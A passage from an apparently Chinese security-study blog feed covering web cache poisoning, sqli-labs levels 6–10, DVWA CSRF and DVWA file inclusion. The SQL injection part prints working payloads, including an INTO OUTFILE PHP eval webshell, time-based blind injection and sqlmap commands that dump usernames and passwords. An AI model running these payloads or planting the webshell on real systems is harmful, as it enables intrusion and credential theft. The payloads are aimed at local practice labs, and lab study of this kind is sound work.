的输入。因此我们可以使用 unkeyed 输入进行注入payload来引发投毒响应，如果改响应被缓存，就会提供给具有匹配的 cache key 的其他用户。<br>通过向请求中添加随机输入并对响应进行观察是否被影响来进行识别非关键输入。</p><p>2、引起后端服务器的有害响应<br>识别出非关键输入后，下一步就是准确评估网站的处理方式。理解这一点对于成功引发有害反应至关重要。如果输入未正确清理就反映在服务器的响应中，或者用于动态生成其他数据，则这是Web缓存投毒的潜在入口点。</p><p>3、获取响应缓存<br>操纵输入以引起有害的响应是成功的一半。是否缓存响应取决于所有因素，例如文件扩展名，内容类型，路由，状态代码和响应标头。需要花费一些时间来简单地处理不同页面上的请求并研究缓存的行为。一旦确定了如何缓存包含恶意输入的响应，便可以将漏洞利用传递给潜在的受害者。</p><p><strong>利用Web缓存投毒漏洞</strong></p><p>可以使用web缓存投毒来进行：XSS攻击、利用对资源的不安全导入、利用cookie处理漏洞、利用基于DOM的漏洞。</p><p>原文链接：<a href="https://blog.csdn.net/cookieXSS/java/article/details/106161723" target="_blank" rel="noopener">https://blog.csdn.net/cookieXSS/java/article/details/106161723</a></p><p><a href="https://xz.aliyun.com/t/7696#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7696#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;缓存投毒原理&quot;&gt;&lt;a href=&quot;#缓存投毒原理&quot; class=&quot;headerlink&quot; title=&quot;缓存投毒原理&quot;&gt;&lt;/a&gt;缓存投毒原理&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;缓存是什么？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;缓存（cache），原始意义是指访问速度比一般
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs（6-10关）</title>
    <link href="http://yoursite.com/2020/05/17/Sqli-labs%EF%BC%886-10%E5%85%B3%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/17/Sqli-labs%EF%BC%886-10%E5%85%B3%EF%BC%89/</id>
    <published>2020-05-17T09:05:41.128Z</published>
    <updated>2020-07-06T14:49:46.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs（6-10关）"><a href="#Sqli-labs（6-10关）" class="headerlink" title="Sqli-labs（6-10关）"></a>Sqli-labs（6-10关）</h1><p>做sqli-labs的时候输入的这些命令要记住吗？懂得看笔记就行</p><h2 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h2><h4 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h4><p>输入?id=1跟1’ 没错，输入?id=1”报错</p><p>这道题与第五关很类似，就只差了个”</p><p>这道题没有显示位，所以得用双查询报错注入</p><p>双查询注入详解参考的链接：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a></p><blockquote><p>归纳：</p><p>1）查询数据库名：</p><p>select count(<em>), concat((select database()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>2）查询版本：</p><p>select count(<em>), concat((select version()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>3）查询用户名：</p><p>select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>4）查询派生表：</p><p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p></blockquote><h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入?id=-1” union select 1,count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到数据库名</p><p>2）输入?id=-1” union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到表名</p><p>3）输入?id=-1” union select 1,count(<em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的字段</p><p>4）输入?id=-1” union select 1,count(<em>),concat((select username from security.users limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的username字段的值</p><h2 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h2><p><strong>1.判断：</strong></p><p>输入？id=1、1“没错，输入？id=1’、1‘）报错，各自加上–+还是报错，输入id=1’))–+对了。</p><p><strong>2.</strong>题目下方出现了Use outfile，所以这关不能用以前的方式来做了，得往服务器写入一句话木马文件然后蚁剑连接。</p><p>file权限和into outfile这个函数：<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>into outfile命令是file系列函数来进行读取敏感文件或者写入webshell。</p><p>into outfile命令使用的环境：<br>我们必须知道，服务器上一个可以写入文件的文件夹的完整路径</p><p>查看是否有写入权限，输入<code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 返回正常，则说明有写入权限。</p><p>输入</p><p><code>?id=-1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\l.php&quot;--+</code></p><p>发现文件导入成功；查看发现里边写的1 2 3，所以可以利用这个上传一句话木马</p><p><code>?id=-1&#39;))  union select 1,&quot;&lt;?php @eval($_POST[&#39;test&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\123.php&quot; --+</code></p><p>然后用蚁剑连接。</p><p>我们怎么知道路径呢？如果要入侵别人的我们怎么会知道路径？</p><h2 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h2><p><strong>1、判断：</strong></p><p>输入?id=1下边显示you are in，输入1‘下边没显示（报错），输入1’–+没报错；说明源码为id=‘ ’</p><p><strong>2、</strong>输入<code>?id=-1&#39; union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\12345.php&quot;--+</code>发现可以成功，所以接下去的步骤与第七关类似。</p><h2 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h2><p><strong>1、判断：</strong></p><p>不管输入什么东西，页面都是you are in；了解知道这个需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：<br>and if((ascii(substr(database(),1,1)))&gt;114,sleep(5),0)</p><p>这里的意思是，如果数据库名首字母的ascii码大于114，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了</p><p>判断时间型盲注语句：’ and sleep(5)%23<br>这里用到的是?id=1’ and sleep(5)–+<br>F12看网络缓存时间，超过5秒就存在时间型盲注</p><p><strong>2.用sqlmap</strong></p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql --dbs --batch</code></p><p>得数据库名</p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security --tables --batch</code>    </p><p> 得到表名</p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security -T users --column --batch</code>      </p><p>得到列名</p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code>     </p><p>得到具体内容</p><p>参考题解：<a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">https://www.jianshu.com/p/875d95f8d3cf</a></p><h2 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h2><p><strong>1、判断：</strong></p><p>跟第九关一样啥也没变，输入’和”都显示正常，尝试?id=3’ and sleep(5)–+，没什么延迟，尝试” and sleep(5)–+延迟时间变为6秒多，说明是双引号的时间型盲注。</p><p><strong>2、用sqlmap注入</strong>，同第九关</p><p>参考题解：<a href="https://www.cnblogs.com/-chenxs/p/11219774.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11219774.html</a></p><p>参考题解：<a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">https://blog.csdn.net/sdb5858874/article/details/80727555</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs（6-10关）&quot;&gt;&lt;a href=&quot;#Sqli-labs（6-10关）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs（6-10关）&quot;&gt;&lt;/a&gt;Sqli-labs（6-10关）&lt;/h1&gt;&lt;p&gt;做sqli-labs的时候输
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DVWA CSRF跨站请求伪造</title>
    <link href="http://yoursite.com/2020/05/17/DVWA%20CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://yoursite.com/2020/05/17/DVWA%20CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2020-05-17T06:46:03.131Z</published>
    <updated>2020-05-17T08:39:22.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-CSRF跨站请求伪造"><a href="#DVWA-CSRF跨站请求伪造" class="headerlink" title="DVWA CSRF跨站请求伪造"></a>DVWA CSRF跨站请求伪造</h1><blockquote><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。<br>例子<br>假如一家银行用以运行转账操作的URL地址如下：<code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code><br>那么，一个恶意攻击者可以在另一个网站上放置如下代码： <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman"><br>如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。<br>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。<br><strong>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义运行操作。</strong></p><h4 id="与XSS区别："><a href="#与XSS区别：" class="headerlink" title="与XSS区别："></a>与XSS区别：</h4><p>XSS是通过修改页面Javascript等代码后，发给用户从而实现盗取cookie信息，之后利用cookie进行登陆网站等操作。非法操作是黑客。<br> CSRF并没有盗取cookie信息，而是通过用户直接利用cookie进行操作。非法操作并不是黑客，而是用户本身。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_45382656/article/details/103828019" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45382656/article/details/103828019</a></p><p>参考链接：<a href="https://baike.baidu.com/item/跨站请求伪造/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/跨站请求伪造/13777878?fromtitle=CSRF&amp;fromid=2735433&amp;fr=aladdin</a></p></blockquote><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?判断是否相同    if( $pass_new == $pass_conf ) {        // They do!下边将特殊字符转义，然后进行MD5加密，然后更新数据库；        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database更新数据库        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);//关闭数据库连接}?&gt; </code></pre><p><strong>1、mysql_real_escape_string() 函数:</strong>  转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：<br>\x00<br>\n<br>\r<br><br>‘<br>“<br>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><p>mysql_real_escape_string(string,connection)<br>string<br>必需。规定要转义的字符串。<br>connection<br>可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</p><p><strong>2、trigger_error() 函数</strong>:  创建用户级别的错误消息。<br>trigger_error() 函数能结合内置的错误处理器所关联，或者可以使用用户定义的函数作为新的错误处理程序(set_error_handler())。</p><p>trigger_error(errormsg,errortype);<br>errormsg<br>必需。规定错误消息。最大长度 1024 字节。<br>errortype<br>可选。规定错误类型。可能的值：E_USER_ERROR、E_USER_WARNING、E_USER_NOTICE（默认）</p><p>服务器通过GET方式接收修改密码的请求，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。这段代码直接将新密码写进数据库，没有验证用户的旧密码，也没有对http引用进行确认，就只判断了是不是两次输入相等而已，这样任何别的网站都可以用你cookies对你的帐户进行CSRF攻击。</p><h4 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h4><p>两个地方均填123，发现提交成功（因为只判断二者是否相等）。用burpsuite抓包，右键Engagement tools-&gt;Generate CSRF RoC，会自动生成html代码，把它存在F盘，命名为csrf1.html。</p><p>在另一个网页打开file:///F:/csrf1.html,页面会出现submit request的按钮，点击则成功修改密码。跳转到dvwa登录界面，会发现原本的密码已经无法登陆，密码为123。</p><p>（可以伪造成一个链接，受害者点击后密码就会被修改）</p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Checks to see where the request came from检查请求来自哪里    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) {//加了HTTP_REFERER验证,当$_SERVER中HTTP_REFERER有SERVER_NAME的值时候，才能进行改密码操作。 //$_SERVER[&#39;HTTP_REFERER&#39;] #链接到当前页面的前一页面的 URL 地址。 //$_SERVER[&#39;SERVER_NAME&#39;] #当前运行脚本所在服务器主机的名称。//把之前的csrf1.html文件重命名为dvwa.com.html可以达到绕过的目的                // Get input        $pass_new  = $_GET[ &#39;password_new&#39; ];        $pass_conf = $_GET[ &#39;password_conf&#39; ];        // Do the passwords match?        if( $pass_new == $pass_conf ) {            // They do!            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));            $pass_new = md5( $pass_new );            // Update the database            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );            // Feedback for the user            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;        }        else {            // Issue with passwords matching            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        }    }    else {        // Didn&#39;t come from a trusted source        echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}?&gt; </code></pre><p>stripos(string,find,start)函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>注释：stripos() 函数是不区分大小写的。<br>注释：该函数是二进制安全的。<br>string<br>必需。规定要搜索的字符串。<br>find<br>必需。规定要查找的字符。<br>start<br>可选。规定开始搜索的位置。</p><h4 id="实战：-1"><a href="#实战：-1" class="headerlink" title="实战："></a>实战：</h4><p>同样利用burpsuite进行csrf攻击，文件命名为dvwa.com.html就可以绕过，成功修改密码。</p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php"> &lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Check Anti-CSRF token采用token验证    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可利用burpsuite中的CSRF Token Tracker绕过token验证插件</p><h4 id="实战：-2"><a href="#实战：-2" class="headerlink" title="实战："></a>实战：</h4><p>burpsuite-&gt;Extender-&gt;BApp Store-&gt;CSRF Token Tracker-&gt;右边页面install</p><p>栏目多了CSRF Token Tracker，点击进入页面-&gt;√Sync requests…-&gt;host填写<a href="http://127.0.0.1，Name填user_token,Value填token字段，并√" target="_blank" rel="noopener">http://127.0.0.1，Name填user_token,Value填token字段，并√</a></p><p>然后将抓到的包send to repeater 可以发现token的值是随机的，登录会发现密码修改成功。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_45382656/article/details/103828019" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45382656/article/details/103828019</a></p><h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $pass_curr = $_GET[ &#39;password_current&#39; ];    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Sanitise current password input    $pass_curr = stripslashes( $pass_curr );//删除反斜杠    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $pass_curr = md5( $pass_curr );    // Check that the current password is correct验证本来的密码对不对    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );    $data-&gt;execute();    // Do both new passwords match and does the current password match the user?    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {        // It does!        $pass_new = stripslashes( $pass_new );        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update database with new password        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;execute();        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p>Impossible Security Level的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码，攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><p> 1、什么是PDO？            </p><p>PDO就是PHP data Object 提供了PHP操作多种数据库的统一的接口    </p><p>2、为什么要使用PDO？                </p><p>PDO是PHP5新加入的一个重大功能，我们的数据库服务器为MySQL，所有的程序代码的数据库操作全是一mysql(）或者mysqli()函数来操作，当我们的数据库 需要更换时比如换成，SQL、SERVER、PostgreSQL、MS 等，我们不可能去修改所有的程序代码！所以就要用到PDO，PDO很好的帮我们解决了这个问题，使用PDO操作非常方便，只需要修改数据源格式，和加载相应的驱动文件到PHP.ini即可；    </p><p>原文链接：<a href="https://blog.csdn.net/jiuyue9561/java/article/details/80379910" target="_blank" rel="noopener">https://blog.csdn.net/jiuyue9561/java/article/details/80379910</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-CSRF跨站请求伪造&quot;&gt;&lt;a href=&quot;#DVWA-CSRF跨站请求伪造&quot; class=&quot;headerlink&quot; title=&quot;DVWA CSRF跨站请求伪造&quot;&gt;&lt;/a&gt;DVWA CSRF跨站请求伪造&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;跨站请求伪
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Dvwa 文件包含漏洞（File Inclusion）</title>
    <link href="http://yoursite.com/2020/05/16/Dvwa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/16/Dvwa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion%EF%BC%89/</id>
    <published>2020-05-16T14:20:48.522Z</published>
    <updated>2020-07-06T14:42:03.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dvwa-文件包含漏洞（File-Inclusion）"><a href="#Dvwa-文件包含漏洞（File-Inclusion）" class="headerlink" title="Dvwa 文件包含漏洞（File Inclusion）"></a>Dvwa 文件包含漏洞（File Inclusion）</h1><p>原理理解参考链接：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p><p><strong>File Inclusion</strong>，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数，利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。<br>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><p>1、文件包含即程序通过包含函数调用本地或远程文件，以此来实现拓展功能<br>2、被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。</p><p>3、文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等函数。</p><h5 id="文件包含分为两类："><a href="#文件包含分为两类：" class="headerlink" title="文件包含分为两类："></a>文件包含分为两类：</h5><p>本地文件包含LFI（local file include）当被包含的文件在服务器本地时，就形成本地文件包含<br>远程文件包含RFI（remote file include）当被包含的文件在第三方服务器时，叫做远程文件包含。</p><h5 id="某些特性函数"><a href="#某些特性函数" class="headerlink" title="某些特性函数"></a>某些特性函数</h5><p>require:找不到被包含的文件，报错，并且停止运行脚本。<br>include:找不到被包含的文件,只会报错，但会继续运行脚本。<br>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p><p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p><p><strong>相关的 php.ini 配置参数：</strong></p><p>allow_url_fopen = on （默认开启）<br>allow_url_include = on （默认关闭）</p><p>远程文件包含是因为开启了 php 配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p>参考链接：<a href="https://www.cnblogs.com/leeqizhi/p/11469943.html" target="_blank" rel="noopener">https://www.cnblogs.com/leeqizhi/p/11469943.html</a> <a href="https://www.cnblogs.com/heiwa-0924/p/12457423.html" target="_blank" rel="noopener">https://www.cnblogs.com/heiwa-0924/p/12457423.html</a></p><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];//$_GET数组复中传递的是通过制url传递的值，page是数组度的下标//如：url为http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=1&amp;id=2//那么传递过道来的$_GET数组中: $_GET[&#39;page&#39;]=1  $_GET[&#39;id&#39;]=2?&gt; </code></pre><p>服务器端对page参数没有做任何的过滤跟检查。服务器希望用户点击图中的三个链接，服务器会包含相应文件，并将结果返回。需要说明的是。不管文件后缀是否是php，都会当做php文件执行，如果文件内容确认为php，则正常执行并返回结果，如果不是，则返回打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><h4 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h4><p>1、点击file1.php后，url为<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file1.php</code></p><p>2、在F盘新建一个123.txt文件内容为helloworld,更改url：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=F:\123.txt</code>发现屏幕上方显示了helloworld，即成功读取。新建php文件并修改url也是同等效果。</p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt; </code></pre><p>str_replace(find,replace,string,count)： 以其他字符替换字符串中的一些字符（区分大小写）。<br>find<br>必需。规定要查找的值。<br>replace<br>必需。规定替换 find 